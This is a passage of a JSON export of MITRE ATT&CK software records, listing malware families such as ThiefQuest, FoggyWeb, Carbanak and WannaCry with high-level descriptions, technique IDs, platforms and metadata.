      "url": "https://attack.mitre.org/software/S1064",
      "stix_id": "malware--7230ded7-3b1a-4d6e-9735-d0ffd47af9f6",
      "created": "2023-02-10T18:05:56.465000+00:00",
      "modified": "2025-04-16T20:38:16.488000+00:00"
    },
    "S0595": {
      "id": "S0595",
      "name": "ThiefQuest",
      "description": "[ThiefQuest](https://attack.mitre.org/software/S0595) is a virus, data stealer, and wiper that presents itself as ransomware targeting macOS systems. [ThiefQuest](https://attack.mitre.org/software/S0595) was first seen in 2020 distributed via trojanized pirated versions of popular macOS software on Russian forums sharing torrent links.(Citation: Reed thiefquest fake ransom) Even though [ThiefQuest](https://attack.mitre.org/software/S0595) presents itself as ransomware, since the dynamically generated encryption key is never sent to the attacker it may be more appropriately thought of as a form of wiper malware.(Citation: wardle evilquest partii)(Citation: reed thiefquest ransomware analysis)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1486",
        "T1071.001",
        "T1564.001",
        "T1056.001",
        "T1554",
        "T1543.004",
        "T1036.005",
        "T1041",
        "T1562.001",
        "T1059.002",
        "T1543.001",
        "T1057",
        "T1620",
        "T1518.001",
        "T1106",
        "T1497.003",
        "T1622",
        "T1105"
      ],
      "platforms": [
        "macOS"
      ],
      "url": "https://attack.mitre.org/software/S0595",
      "stix_id": "malware--727afb95-3d0f-4451-b297-362a43909923",
      "created": "2021-03-19T16:26:04.260000+00:00",
      "modified": "2025-04-16T20:38:16.679000+00:00"
    },
    "S0661": {
      "id": "S0661",
      "name": "FoggyWeb",
      "description": "[FoggyWeb](https://attack.mitre.org/software/S0661) is a passive and highly-targeted backdoor capable of remotely exfiltrating sensitive information from a compromised Active Directory Federated Services (AD FS) server. It has been used by [APT29](https://attack.mitre.org/groups/G0016) since at least early April 2021.(Citation: MSTIC FoggyWeb September 2021)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1140",
        "T1560.003",
        "T1041",
        "T1027.004",
        "T1005",
        "T1027.013",
        "T1071.001",
        "T1552.004",
        "T1036",
        "T1057",
        "T1550",
        "T1106",
        "T1129",
        "T1040",
        "T1560.002",
        "T1105",
        "T1574.001",
        "T1036.005",
        "T1083",
        "T1620",
        "T1573.001"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0661",
      "stix_id": "malware--72911fe3-f085-40f7-b4f2-f25a4221fe44",
      "created": "2021-11-16T14:33:46.321000+00:00",
      "modified": "2024-04-11T02:32:04.884000+00:00"
    },
    "S1106": {
      "id": "S1106",
      "name": "NGLite",
      "description": "[NGLite](https://attack.mitre.org/software/S1106) is a backdoor Trojan that is only capable of running commands received through its C2 channel. While the capabilities are standard for a backdoor, NGLite uses a novel C2 channel that leverages a decentralized network based on the legitimate NKN to communicate between the backdoor and the actors.(Citation: NGLite Trojan)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1071.001",
        "T1033",
        "T1573.001",
        "T1090.003",
        "T1016"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S1106",
      "stix_id": "malware--72b5f07f-5448-4e00-9ff2-08bc193a7b77",
      "created": "2024-02-08T15:23:05.910000+00:00",
      "modified": "2024-04-19T13:24:36.873000+00:00"
    },
    "S0030": {
      "id": "S0030",
      "name": "Carbanak",
      "description": "[Carbanak](https://attack.mitre.org/software/S0030) is a full-featured, remote backdoor used by a group of the same name ([Carbanak](https://attack.mitre.org/groups/G0008)). It is intended for espionage, data exfiltration, and providing remote access to infected machines. (Citation: Kaspersky Carbanak) (Citation: FireEye CARBANAK June 2017)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1003",
        "T1113",
        "T1071.001",
        "T1012",
        "T1021.001",
        "T1059.003",
        "T1055.002",
        "T1114.001",
        "T1057",
        "T1027",
        "T1219",
        "T1056.001",
        "T1547.001",
        "T1136.001",
        "T1573.001",
        "T1070.004",
        "T1132.001",
        "T1030"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0030",
      "stix_id": "malware--72f54d66-675d-4587-9bd3-4ed09f9522e4",
      "created": "2017-05-31T21:32:22.213000+00:00",
      "modified": "2025-04-16T20:38:16.838000+00:00"
    },
    "S0117": {
      "id": "S0117",
      "name": "XTunnel",
      "description": "[XTunnel](https://attack.mitre.org/software/S0117) a VPN-like network proxy tool that can relay traffic between a C2 server and a victim. It was first seen in May 2013 and reportedly used by [APT28](https://attack.mitre.org/groups/G0007) during the compromise of the Democratic National Committee. (Citation: Crowdstrike DNC June 2016) (Citation: Invincea XTunnel) (Citation: ESET Sednit Part 2)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1552.001",
        "T1027.016",
        "T1059.003",
        "T1046",
        "T1573.002",
        "T1090",
        "T1027",
        "T1008"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0117",
      "stix_id": "malware--7343e208-7cab-45f2-a47b-41ba5e2f0fab",
      "created": "2017-05-31T21:33:09.453000+00:00",
      "modified": "2025-04-25T14:43:45.148000+00:00"
    },
    "S0203": {
      "id": "S0203",
      "name": "Hydraq",
      "description": "[Hydraq](https://attack.mitre.org/software/S0203) is a data-theft trojan first used by [Elderwood](https://attack.mitre.org/groups/G0066) in the 2009 Google intrusion known as Operation Aurora, though variations of this trojan have been used in more recent campaigns by other Chinese actors, possibly including [APT17](https://attack.mitre.org/groups/G0025).(Citation: MicroFocus 9002 Aug 2016)(Citation: Symantec Elderwood Sept 2012)(Citation: Symantec Trojan.Hydraq Jan 2010)(Citation: ASERT Seven Pointed Dagger Aug 2015)(Citation: FireEye DeputyDog 9002 November 2013)(Citation: ProofPoint GoT 9002 Aug 2017)(Citation: FireEye Sunshop Campaign May 2013)(Citation: PaloAlto 3102 Sept 2015)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1012",
        "T1129",
        "T1569.002",
        "T1016",
        "T1082",
        "T1005",
        "T1112",
        "T1105",
        "T1027",
        "T1543.003",
        "T1573.001",
        "T1007",
        "T1070.004",
        "T1057",
        "T1113",
        "T1070.001",
        "T1048",
        "T1083",
        "T1134"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0203",
      "stix_id": "malware--73a4793a-ce55-4159-b2a6-208ef29b326f",
      "created": "2018-04-18T17:59:24.739000+00:00",
      "modified": "2024-11-17T19:55:07.589000+00:00"
    },
    "S0450": {
      "id": "S0450",
      "name": "SHARPSTATS",
      "description": "[SHARPSTATS](https://attack.mitre.org/software/S0450) is a .NET backdoor used by [MuddyWater](https://attack.mitre.org/groups/G0069) since at least 2019.(Citation: TrendMicro POWERSTATS V3 June 2019)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1016",
        "T1059.001",
        "T1105",
        "T1027.010",
        "T1082",
        "T1124",
        "T1033"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0450",
      "stix_id": "malware--73c4711b-407a-449d-b269-e3b1531fe7a9",
      "created": "2020-05-18T19:51:37.488000+00:00",
      "modified": "2025-04-16T20:38:17.168000+00:00"
    },
    "S0679": {
      "id": "S0679",
      "name": "Ferocious",
      "description": "[Ferocious](https://attack.mitre.org/software/S0679) is a first stage implant composed of VBS and PowerShell scripts that has been used by [WIRTE](https://attack.mitre.org/groups/G0090) since at least 2021.(Citation: Kaspersky WIRTE November 2021)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1059.005",
        "T1120",
        "T1518.001",
        "T1546.015",
        "T1059.001",
        "T1497.001",
        "T1082",
        "T1070.004",
        "T1112"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0679",
      "stix_id": "malware--73d08401-005f-4e1f-90b9-8f45d120879f",
      "created": "2022-02-01T19:19:26.408000+00:00",
      "modified": "2025-04-25T14:43:45.868000+00:00"
    },
    "S0232": {
      "id": "S0232",
      "name": "HOMEFRY",
      "description": "[HOMEFRY](https://attack.mitre.org/software/S0232) is a 64-bit Windows password dumper/cracker that has previously been used in conjunction with other [Leviathan](https://attack.mitre.org/groups/G0065) backdoors. (Citation: FireEye Periscope March 2018)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1003",
        "T1027.013",
        "T1059.003"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0232",
      "stix_id": "malware--7451bcf9-e6e6-4a70-bc3d-1599173d0035",
      "created": "2018-04-18T17:59:24.739000+00:00",
      "modified": "2024-04-11T02:18:12.743000+00:00"
    },
    "S1023": {
      "id": "S1023",
      "name": "CreepyDrive",
      "description": "[CreepyDrive](https://attack.mitre.org/software/S1023) is a custom implant has been used by [POLONIUM](https://attack.mitre.org/groups/G1005) since at least early 2022 for C2 with and exfiltration to actor-controlled OneDrive accounts.(Citation: Microsoft POLONIUM June 2022)\n\n[POLONIUM](https://attack.mitre.org/groups/G1005) has used a similar implant called CreepyBox that relies on actor-controlled DropBox accounts.(Citation: Microsoft POLONIUM June 2022)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1071.001",
        "T1567.002",
        "T1102.002",
        "T1550.001",
        "T1083",
        "T1105",
        "T1059.001",
        "T1005"
      ],
      "platforms": [
        "Windows",
        "Office Suite"
      ],
      "url": "https://attack.mitre.org/software/S1023",
      "stix_id": "malware--750eb92a-7fdf-451e-9592-1d42357018f1",
      "created": "2022-07-07T14:30:25.403000+00:00",
      "modified": "2025-04-16T20:38:17.473000+00:00"
    },
    "S0572": {
      "id": "S0572",
      "name": "Caterpillar WebShell",
      "description": "[Caterpillar WebShell](https://attack.mitre.org/software/S0572) is a self-developed Web Shell tool created by the group [Volatile Cedar](https://attack.mitre.org/groups/G0123).(Citation: ClearSky Lebanese Cedar Jan 2021) ",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1057",
        "T1005",
        "T1016",
        "T1083",
        "T1110",
        "T1059.003",
        "T1007",
        "T1112",
        "T1069.001",
        "T1041",
        "T1082",
        "T1033",
        "T1105",
        "T1014",
        "T1046"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0572",
      "stix_id": "malware--751b77e6-af1f-483b-93fe-eddf17f92a64",
      "created": "2021-02-10T18:20:51.309000+00:00",
      "modified": "2025-04-25T14:43:46.592000+00:00"
    },
    "S0457": {
      "id": "S0457",
      "name": "Netwalker",
      "description": "[Netwalker](https://attack.mitre.org/software/S0457) is fileless ransomware written in PowerShell and executed directly in memory.(Citation: TrendMicro Netwalker May 2020)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1112",
        "T1562.001",
        "T1082",
        "T1570",
        "T1140",
        "T1059.003",
        "T1027.010",
        "T1518.001",
        "T1027.009",
        "T1490",
        "T1059.001",
        "T1106",
        "T1486",
        "T1569.002",
        "T1047",
        "T1489",
        "T1105",
        "T1055.001"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0457",
      "stix_id": "malware--754effde-613c-4244-a83e-fb659b2a4d06",
      "created": "2020-05-26T21:02:38.186000+00:00",
      "modified": "2025-04-16T20:38:17.793000+00:00"
    },
    "S0081": {
      "id": "S0081",
      "name": "Elise",
      "description": "[Elise](https://attack.mitre.org/software/S0081) is a custom backdoor Trojan that appears to be used exclusively by [Lotus Blossom](https://attack.mitre.org/groups/G0030). It is part of a larger group of tools referred to as LStudio, ST Group, and APT0LSTU.(Citation: Lotus Blossom Jun 2015)(Citation: Accenture Dragonfish Jan 2018)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1036.005",
        "T1105",
        "T1082",
        "T1573.001",
        "T1007",
        "T1543.003",
        "T1016",
        "T1218.011",
        "T1057",
        "T1027.013",
        "T1070.006",
        "T1083",
        "T1074.001",
        "T1070.004",
        "T1071.001",
        "T1132.001",
        "T1087.001",
        "T1547.001",
        "T1055.001"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0081",
      "stix_id": "malware--7551188b-8f91-4d34-8350-0d0c57b2b913",
      "created": "2017-05-31T21:32:54.416000+00:00",
      "modified": "2025-04-02T20:34:59.728000+00:00"
    },
    "S0452": {
      "id": "S0452",
      "name": "USBferry",
      "description": "[USBferry](https://attack.mitre.org/software/S0452) is an information stealing malware and has been used by [Tropic Trooper](https://attack.mitre.org/groups/G0081) in targeted attacks against Taiwanese and Philippine air-gapped military environments. [USBferry](https://attack.mitre.org/software/S0452) shares an overlapping codebase with [YAHOYAH](https://attack.mitre.org/software/S0388), though it has several features which makes it a distinct piece of malware.(Citation: TrendMicro Tropic Trooper May 2020)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1087.001",
        "T1018",
        "T1083",
        "T1120",
        "T1016",
        "T1059.003",
        "T1091",
        "T1218.011",
        "T1005",
        "T1057",
        "T1049"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0452",
      "stix_id": "malware--75bba379-4ba1-467e-8c60-ec2b269ee984",
      "created": "2020-05-20T19:54:06.476000+00:00",
      "modified": "2025-04-25T14:43:47.313000+00:00"
    },
    "S0366": {
      "id": "S0366",
      "name": "WannaCry",
      "description": "[WannaCry](https://attack.mitre.org/software/S0366) is ransomware that was first seen in a global attack during May 2017, which affected more than 150 countries. It contains worm-like features to spread itself across a computer network using the SMBv1 exploit EternalBlue.(Citation: LogRhythm WannaCry)(Citation: US-CERT WannaCry 2017)(Citation: Washington Post WannaCry 2017)(Citation: FireEye WannaCry 2017)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1210",
        "T1489",
        "T1083",
        "T1120",
        "T1486",
        "T1047",
        "T1563.002",
        "T1490",
        "T1018",
        "T1564.001",
        "T1016",
        "T1222.001",
        "T1090.003",
        "T1573.002",
        "T1543.003",
        "T1570"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0366",
      "stix_id": "malware--75ecdbf1-c2bb-4afc-a3f9-c8da4de8c661",
      "created": "2019-03-25T17:30:17.004000+00:00",
      "modified": "2024-12-09T02:29:13.859000+00:00"
    },
    "S0168": {
      "id": "S0168",
      "name": "Gazer",
      "description": "[Gazer](https://attack.mitre.org/software/S0168) is a backdoor used by [Turla](https://attack.mitre.org/groups/G0010) since at least 2016. (Citation: ESET Gazer Aug 2017)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1547.004",
        "T1070.006",
        "T1573.002",
        "T1547.001",
        "T1071.001",
        "T1547.009",
        "T1070.004",
        "T1055.003",
        "T1055",
        "T1105",
        "T1573.001",
        "T1546.002",
        "T1553.002",
        "T1033",
        "T1564.004",
        "T1027.013",
        "T1053.005",
        "T1480.002"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0168",
      "stix_id": "malware--76abb3ef-dafd-4762-97cb-a35379429db4",
      "created": "2018-01-16T16:13:52.465000+00:00",
      "modified": "2024-04-11T02:28:51.206000+00:00"
    },
    "S0436": {
      "id": "S0436",
      "name": "TSCookie",
      "description": "[TSCookie](https://attack.mitre.org/software/S0436) is a remote access tool (RAT) that has been used by [BlackTech](https://attack.mitre.org/groups/G0098) in campaigns against Japanese targets.(Citation: JPCert TSCookie March 2018)(Citation: JPCert BlackTech Malware September 2019). [TSCookie](https://attack.mitre.org/software/S0436) has been referred to as [PLEAD](https://attack.mitre.org/software/S0435) though more recent reporting indicates a separation between the two.(Citation: JPCert PLEAD Downloader June 2018)(Citation: JPCert BlackTech Malware September 2019)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1059.003",
        "T1057",
        "T1105",
        "T1095",
        "T1071.001",
        "T1055",
        "T1140",
        "T1555.003",
        "T1083",
        "T1090",
        "T1573.001",
        "T1016",
        "T1204.001"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0436",
      "stix_id": "malware--76ac7989-c5cc-42e2-93e3-d6c476f01ace",
      "created": "2020-05-06T15:43:49.556000+00:00",
      "modified": "2025-04-16T20:38:18.117000+00:00"
    },
    "S1160": {
      "id": "S1160",
      "name": "Latrodectus",
      "description": "[Latrodectus](https://attack.mitre.org/software/S1160) is a Windows malware downloader that has been used since at least 2023 to download and execute additional payloads and modules. [Latrodectus](https://attack.mitre.org/software/S1160) has most often been distributed through email campaigns, primarily by [TA577](https://attack.mitre.org/groups/G1037) and [TA578](https://attack.mitre.org/groups/G1038), and has infrastructure overlaps with historic [IcedID](https://attack.mitre.org/software/S0483) operations.(Citation: Latrodectus APR 2024)(Citation: Bleeping Computer Latrodectus April 2024)(Citation: Bitsight Latrodectus June 2024)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1102",
        "T1218.011",
        "T1132.001",
        "T1059.003",
        "T1016",
        "T1218.007",
        "T1135",
        "T1057",
        "T1033",
        "T1053.005",
        "T1204.001",
        "T1027.007",
        "T1005",
        "T1566.001",
        "T1140",
        "T1070.004",
        "T1083",
        "T1559.001",
        "T1027.002",
        "T1059.007",
        "T1105",
        "T1071.001",
        "T1041",
        "T1036.005",
        "T1106",
        "T1204.002",
        "T1104",
        "T1482",
        "T1027.001",
        "T1529",
        "T1082",
        "T1518.001",
        "T1573.001",
        "T1564.004",
        "T1069.002",
        "T1027.013",
        "T1547.001",
        "T1497.001",
        "T1566.002",
        "T1047",
        "T1622",
        "T1087.002",
        "T1021.005"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S1160",
      "stix_id": "malware--76fde8df-3495-47c9-82eb-125c4f7fb621",
      "created": "2024-09-16T18:47:30.547000+00:00",
      "modified": "2024-09-30T17:59:30.330000+00:00"
    },
    "S1018": {
      "id": "S1018",
      "name": "Saint Bot",
      "description": "[Saint Bot](https://attack.mitre.org/software/S1018) is a .NET downloader that has been used by [Saint Bear](https://attack.mitre.org/groups/G1031) since at least March 2021.(Citation: Malwarebytes Saint Bot April 2021)(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 )",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1218.010",
        "T1055.001",
        "T1016",
        "T1548.002",
        "T1027",
        "T1036",
        "T1105",
        "T1071.001",
        "T1082",
        "T1059.003",
        "T1497.003",
        "T1012",
        "T1053.005",
        "T1106",
        "T1204.002",
        "T1055.004",
        "T1566.002",
        "T1027.002",
        "T1059.005",
        "T1497.001",
        "T1059.001",
        "T1622",
        "T1614",
        "T1547.001",
        "T1140",
        "T1055.012",
        "T1057",
        "T1566.001",
        "T1036.005",
        "T1083",
        "T1574",
        "T1033",
        "T1218.004",
        "T1204.001",
        "T1132.001",
        "T1070.004",
        "T1005"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S1018",
      "stix_id": "malware--7724581b-06ff-4d2b-b77c-80dc8d53070b",
      "created": "2022-06-09T18:50:58.722000+00:00",
      "modified": "2024-10-08T20:10:44.570000+00:00"
    },
    "S0556": {
      "id": "S0556",
      "name": "Pay2Key",
      "description": "[Pay2Key](https://attack.mitre.org/software/S0556) is a ransomware written in C++ that has been used by [Fox Kitten](https://attack.mitre.org/groups/G0117) since at least July 2020 including campaigns against Israeli companies. [Pay2Key](https://attack.mitre.org/software/S0556) has been incorporated with a leak site to display stolen sensitive information to further pressure victims into payment.(Citation: ClearkSky Fox Kitten February 2020)(Citation: Check Point Pay2Key November 2020)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1090.001",
        "T1573.002",
        "T1489",
        "T1070.004",
        "T1095",
        "T1082",
        "T1486",
        "T1016"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0556",
      "stix_id": "malware--77ca1aa3-280c-4b67-abaa-e8fb891a8f83",
      "created": "2021-01-04T15:12:14.805000+00:00",
      "modified": "2025-04-25T14:43:48.585000+00:00"
    },
    "S0631": {
      "id": "S0631",
      "name": "Chaes",
      "description": "[Chaes](https://attack.mitre.org/software/S0631) is a multistage information stealer written in several programming languages that collects login credentials, credit card numbers, and other financial information. [Chaes](https://attack.mitre.org/software/S0631) was first observed in 2020, and appears to primarily target victims in Brazil as well as other e-commerce customers in Latin America.(Citation: Cybereason Chaes Nov 2020)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1218.007",
        "T1204.002",
        "T1132.001",
        "T1573",
        "T1106",
        "T1218.004",
        "T1059.005",
        "T1566.001",
        "T1033",
        "T1048",
        "T1059.006",
        "T1539",
        "T1036.005",
        "T1221",
        "T1112",
        "T1547.001",
        "T1056",
        "T1574.001",
        "T1027.011",
        "T1071.001",
        "T1059.003",
        "T1059.007",
        "T1185",
        "T1105",
        "T1113",
        "T1140",
        "T1082",
        "T1555.003"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0631",
      "stix_id": "malware--77e0ecf7-ca91-4c06-8012-8e728986a87a",
      "created": "2021-06-30T16:13:40.232000+00:00",
      "modified": "2025-04-16T20:38:18.426000+00:00"
    },
    "S0204": {
      "id": "S0204",
      "name": "Briba",
      "description": "[Briba](https://attack.mitre.org/software/S0204) is a trojan used by [Elderwood](https://attack.mitre.org/groups/G0066) to open a backdoor and download files on to compromised hosts. (Citation: Symantec Elderwood Sept 2012) (Citation: Symantec Briba May 2012)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1543.003",
        "T1218.011",
        "T1105",
        "T1547.001"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0204",
      "stix_id": "malware--79499993-a8d6-45eb-b343-bf58dea5bdde",
      "created": "2018-04-18T17:59:24.739000+00:00",
      "modified": "2024-11-17T19:55:07.590000+00:00"
    },
    "S0674": {
      "id": "S0674",
      "name": "CharmPower",
      "description": "[CharmPower](https://attack.mitre.org/software/S0674) is a PowerShell-based, modular backdoor that has been used by [Magic Hound](https://attack.mitre.org/groups/G0059) since at least 2022.(Citation: Check Point APT35 CharmPower January 2022)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1112",
        "T1082",
        "T1518",
        "T1048.003",
        "T1573.001",
        "T1140",
        "T1041",
        "T1102.001",
        "T1083",
        "T1059.001",
        "T1070.004",
        "T1071.001",
        "T1008",
        "T1049",
        "T1057",
        "T1102",
        "T1005",
        "T1059.003",
        "T1016",
        "T1113",
        "T1105",
        "T1132.001",
        "T1047",
        "T1012"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0674",
      "stix_id": "malware--7acb15b6-fe2c-4319-b136-6ab36ff0b2d4",
      "created": "2022-01-24T16:56:36.108000+00:00",
      "modified": "2025-04-25T14:43:49.304000+00:00"
    },
    "S0263": {
      "id": "S0263",
      "name": "TYPEFRAME",
      "description": "[TYPEFRAME](https://attack.mitre.org/software/S0263) is a remote access tool that has been used by [Lazarus Group](https://attack.mitre.org/groups/G0032). (Citation: US-CERT TYPEFRAME June 2018)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1027.011",
        "T1105",
        "T1562.004",
        "T1027.013",
        "T1204.002",
        "T1140",
        "T1090",
        "T1059.005",
        "T1543.003",
        "T1112",
        "T1082",
        "T1571",
        "T1059.003",
        "T1070.004",
        "T1083"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0263",
      "stix_id": "malware--7ba0fc46-197d-466d-8b9f-f1c64d5d81e5",
      "created": "2018-10-17T00:14:20.652000+00:00",
      "modified": "2024-04-10T22:26:03.638000+00:00"
    },
    "S0066": {
      "id": "S0066",
      "name": "3PARA RAT",
      "description": "[3PARA RAT](https://attack.mitre.org/software/S0066) is a remote access tool (RAT) programmed in C++ that has been used by [Putter Panda](https://attack.mitre.org/groups/G0024). (Citation: CrowdStrike Putter Panda)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1573.001",
        "T1071.001",
        "T1083",
        "T1070.006"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0066",
      "stix_id": "malware--7bec698a-7e20-4fd3-bb6a-12787770fb1a",
      "created": "2017-05-31T21:32:44.131000+00:00",
      "modified": "2025-04-25T14:43:49.838000+00:00"
    },
    "S0482": {
      "id": "S0482",
      "name": "Bundlore",
      "description": "[Bundlore](https://attack.mitre.org/software/S0482) is adware written for macOS that has been in use since at least 2015. Though categorized as adware, [Bundlore](https://attack.mitre.org/software/S0482) has many features associated with more traditional backdoors.(Citation: MacKeeper Bundlore Apr 2019)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1048",
        "T1036.005",
        "T1082",
        "T1057",
        "T1059.004",
        "T1564",
        "T1189",
        "T1098.004",
        "T1059.006",
        "T1140",
        "T1105",
        "T1543.001",
        "T1027",
        "T1518",
        "T1056.002",
        "T1204.002",
        "T1543.004",
        "T1176.001",
        "T1059.002",
        "T1059.007",
        "T1222.002",
        "T1071.001",
        "T1562.001"
      ],
      "platforms": [
        "macOS"
      ],
      "url": "https://attack.mitre.org/software/S0482",
      "stix_id": "malware--7bef1b56-4870-4e74-b32a-7dd88c390c44",
      "created": "2020-07-01T19:34:28.366000+00:00",
      "modified": "2025-04-25T14:43:50.199000+00:00"
    },
    "S0626": {
      "id": "S0626",
      "name": "P8RAT",
      "description": "[P8RAT](https://attack.mitre.org/software/S0626) is a fileless malware used by [menuPass](https://attack.mitre.org/groups/G0045) to download and execute payloads since at least 2020.(Citation: Securelist APT10 March 2021)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1497.003",
        "T1057",
        "T1001.001",
        "T1497.001",
        "T1105"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0626",
      "stix_id": "malware--7c58fff0-d206-4db1-96b1-e3a9e0e320b9",
      "created": "2021-06-21T15:02:47.928000+00:00",
      "modified": "2025-04-25T14:43:50.562000+00:00"
    },
    "S0568": {
      "id": "S0568",
      "name": "EVILNUM",
      "description": "[EVILNUM](https://attack.mitre.org/software/S0568) is fully capable backdoor that was first identified in 2018. [EVILNUM](https://attack.mitre.org/software/S0568) is used by the APT group [Evilnum](https://attack.mitre.org/groups/G0120) which has the same name.(Citation: ESET EvilNum July 2020)(Citation: Prevailion EvilNum May 2020)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1102.003",
        "T1547.001",
        "T1070",
        "T1082",
        "T1041",
        "T1539",
        "T1070.006",
        "T1112",
        "T1105",
        "T1033",
        "T1218.011",
        "T1518.001",
        "T1218.010",
        "T1047"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0568",
      "stix_id": "malware--7cdfccda-2950-4167-981a-60872ff5d0db",
      "created": "2021-01-28T17:24:48.322000+00:00",
      "modified": "2024-11-17T23:13:51.280000+00:00"
    },
    "S0156": {
      "id": "S0156",
      "name": "KOMPROGO",
      "description": "[KOMPROGO](https://attack.mitre.org/software/S0156) is a signature backdoor used by [APT32](https://attack.mitre.org/groups/G0050) that is capable of process, file, and registry management. (Citation: FireEye APT32 May 2017)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1082",
        "T1047",
        "T1059.003"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0156",
      "stix_id": "malware--7dbb67c7-270a-40ad-836e-c45f8948aa5a",
      "created": "2017-12-14T16:46:06.044000+00:00",
      "modified": "2025-04-25T14:43:51.104000+00:00"
    },
    "S0649": {
      "id": "S0649",
      "name": "SMOKEDHAM",
      "description": "[SMOKEDHAM](https://attack.mitre.org/software/S0649) is a Powershell-based .NET backdoor that was first reported in May 2021; it has been used by at least one ransomware-as-a-service affiliate.(Citation: FireEye Shining A Light on DARKSIDE May 2021)(Citation: FireEye SMOKEDHAM June 2021)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1573.001",
        "T1564.002",
        "T1132.001",
        "T1136.001",
        "T1112",
        "T1098.007",
        "T1105",
        "T1102",
        "T1082",
        "T1204.001",
        "T1071.001",
        "T1056.001",
        "T1547.001",
        "T1033",
        "T1598.003",
        "T1041",
        "T1027.009",
        "T1113",
        "T1059.001",
        "T1087.001",
        "T1090.004"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0649",
      "stix_id": "malware--7e0f8b0f-716e-494d-827e-310bd6ed709e",
      "created": "2021-09-22T20:11:08.678000+00:00",
      "modified": "2025-04-16T20:38:19.381000+00:00"
    },
    "S1047": {
      "id": "S1047",
      "name": "Mori",
      "description": "[Mori](https://attack.mitre.org/software/S1047) is a backdoor that has been used by [MuddyWater](https://attack.mitre.org/groups/G0069) since at least January 2022.(Citation: DHS CISA AA22-055A MuddyWater February 2022)(Citation: CYBERCOM Iranian Intel Cyber January 2022)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1071.001",
        "T1001.001",
        "T1218.010",
        "T1140",
        "T1071.004",
        "T1012",
        "T1112",
        "T1070.004",
        "T1132.001"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S1047",
      "stix_id": "malware--7e100ca4-e639-48d9-9a9d-8ad84aa7b448",
      "created": "2022-09-30T15:21:05.086000+00:00",
      "modified": "2025-04-16T20:38:19.542000+00:00"
    },
    "S0269": {
      "id": "S0269",
      "name": "QUADAGENT",
      "description": "[QUADAGENT](https://attack.mitre.org/software/S0269) is a PowerShell backdoor used by [OilRig](https://attack.mitre.org/groups/G0049). (Citation: Unit 42 QUADAGENT July 2018)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1071.004",
        "T1071.001",
        "T1140",
        "T1132.001",
        "T1059.005",
        "T1016",
        "T1027.010",
        "T1059.003",
        "T1036.005",
        "T1027.011",
        "T1070.004",
        "T1012",
        "T1059.001",
        "T1008",
        "T1112",
        "T1033",
        "T1053.005"
      ],
      "platforms": [
        "Windows"
      ],
